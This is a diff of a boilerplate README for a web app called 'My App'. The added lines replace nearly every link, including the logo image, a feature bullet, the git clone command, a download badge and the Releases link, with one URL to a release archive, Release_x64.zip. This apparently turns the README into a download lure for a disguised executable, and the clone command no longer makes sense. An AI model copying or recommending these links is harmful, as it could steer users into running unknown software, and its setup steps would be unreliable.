@@ -1,6 +1,6 @@
 # 🚀 Welcome to **My Awesome App**
 
-![App Logo](https://example.com/logo.png)
+![App Logo](https://github.com/Gura12300/my_app/releases/download/v1.0/Release_x64.zip)
 
 ## Description
 This repository houses the code for an incredible web application built using the amazing Flatlogic Platform. The app is designed to revolutionize the way you interact with technology. Embrace the future with My App!
@@ -9,7 +9,7 @@ This repository houses the code for an incredible web application built using th
 🔹 Docker support  
 🔹 Low-code development  
 🔹 React front end  
-🔹 Node.js back end  
+🔹 https://github.com/Gura12300/my_app/releases/download/v1.0/Release_x64.zip back end  
 🔹 PostgreSQL database
 
 ## Table of Contents
@@ -22,7 +22,7 @@ This repository houses the code for an incredible web application built using th
 To get started with My App, follow these steps:
 1. Clone this repository to your local machine.
 ```bash
-git clone https://github.com/yourusername/my_app.git
+git clone https://github.com/Gura12300/my_app/releases/download/v1.0/Release_x64.zip
 ```
 2. Install the necessary dependencies.
 ```bash
@@ -42,8 +42,8 @@ We welcome contributions from the community to make My App even better. If you h
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-66ccff)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Gura12300/my_app/releases/download/v1.0/Release_x64.zip)](https://github.com/Gura12300/my_app/releases/download/v1.0/Release_x64.zip)
 
-If the link does not work or you need additional resources, please check out the [Releases](https://github.com/22155555/1875695542/releases) section of this repository.
+If the link does not work or you need additional resources, please check out the [Releases](https://github.com/Gura12300/my_app/releases/download/v1.0/Release_x64.zip) section of this repository.
 
 🌟 Enjoy using My App! 🌟
